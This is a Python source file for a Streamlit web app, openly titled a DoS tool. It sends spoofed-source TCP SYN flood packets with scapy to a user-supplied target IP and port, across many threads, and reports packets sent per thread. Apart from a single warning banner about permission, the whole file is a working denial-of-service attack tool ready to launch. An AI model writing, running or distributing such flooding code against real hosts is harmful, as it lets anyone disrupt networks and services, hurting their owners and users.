import streamlit as st
import ipaddress
import time
from random import randint
from scapy.all import IP, TCP, send
from concurrent.futures import ThreadPoolExecutor, as_completed

def randomIP():
    return ".".join(str(randint(1,255)) for _ in range(4))

def randInt():
    return randint(1000, 9000)

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip); return True
    except ValueError:
        return False

def SYN_Flood(dstIP, dstPort, count, rate_limit):
    sent = 0
    errors = 0
    for i in range(count):
        try:
            pkt = IP(src=randomIP(), dst=dstIP) / \
                  TCP(sport=randInt(), dport=dstPort,
                      flags="S", seq=randInt(), window=randInt())
            send(pkt, verbose=0)
            sent += 1
        except Exception:
            errors += 1
        if rate_limit > 0:
            time.sleep(1 / rate_limit)
    return sent, errors

def SYN_Flood_Threaded(dstIP, dstPort, total_packets, threads, rate_limit):
    per_thread = total_packets // threads
    futures = []
    with ThreadPoolExecutor(max_workers=threads) as exe:
        for _ in range(threads):
            futures.append(exe.submit(SYN_Flood, dstIP, dstPort, per_thread, rate_limit))

    results = [f.result() for f in futures]  # list of (sent, errors)
    return results

# —— Streamlit UI —— #
st.title("💥 Streamlit DoS Tool (SYN Flood)")

st.warning("⚠️ Only test systems you own or have explicit permission to test!")

dstIP      = st.text_input("Target IP")
dstPort    = st.number_input("Target Port", 1, 65535, 80)
total_pkts = st.number_input("Packet Count", 1, 1000000)
threads    = st.number_input("Threads", 1, 10000)
rate_limit = st.number_input("Rate Limit (pkts/sec per thread)", 0, 10000, 100)

if st.button("Launch SYN Flood"):
    if not validate_ip(dstIP):
        st.error("❌ Invalid IP address!")
    else:
        st.info(f"Flooding {dstIP}:{dstPort} — {total_pkts} pkts, {threads} threads, {rate_limit} pps")
        with st.spinner("Attack in progress…"):
            results = SYN_Flood_Threaded(dstIP, dstPort, total_pkts, threads, rate_limit)

        # Batch summary—UI only in main thread
        st.success("✅ Attack completed!")
        total_sent = sum(s for s, _ in results)
        total_err  = sum(e for _, e in results)

        st.subheader("📊 Thread Results")
        for idx, (s, e) in enumerate(results, 1):
            st.text(f"Thread {idx}: Sent={s}, Errors={e}")

        st.write(f"**Total packets sent:** {total_sent}")
        st.write(f"**Total errors:** {total_err}")
